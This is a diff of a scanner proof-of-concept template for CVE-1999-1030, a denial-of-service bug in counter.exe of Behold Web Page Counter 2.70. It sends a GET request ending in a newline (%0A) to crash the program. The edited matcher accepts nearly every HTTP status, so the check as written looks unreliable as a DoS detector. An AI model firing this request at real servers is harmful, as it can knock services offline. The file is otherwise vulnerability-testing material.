@@ -1,13 +1,10 @@
 [info]
-author = "AVE"
-description = "检测向 counter.exe 发送以 %0A 结尾的 HTTP 请求是否导致服务拒绝"
+author = "ave"
+description = "Behold Software Web Page Counter 2.70 的 counter.exe 在处理以 %0A（换行符）结尾的 HTTP 请求时，会在计数器日志中写入畸形条目并触发访问违反，导致程序 hang 死锁。本 PoC 通过向 counter.exe 发送以换行结尾的 HTTP 请求，验证目标是否出现拒绝服务（无响应或挂起）。"
 id = "POC-AVE-1999-0885"
-name = "Behold Software Web Page Counter 2.7 counter.exe DoS PoC"
+name = "CVE-1999-1030 counter.exe 拒绝服务 PoC"
 severity = "medium"
-tags = [
-    "cve-1999-1030",
-    "dos",
-]
+tags = ["ave-1999-0885"]
 vuln_id = [
     "CVE-1999-1030",
     "AVE-1999-0885",
@@ -18,13 +15,21 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/counter.exe?%0A"
+path = "/cgi-bin/counter.exe%0A"
 protocol = "http"
 
 [poc.requests.headers]
 User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
-expect = false
-status = [200]
+expect = true
+status = [
+    200,
+    301,
+    302,
+    307,
+    401,
+    403,
+    404,
+]
 type = "status"
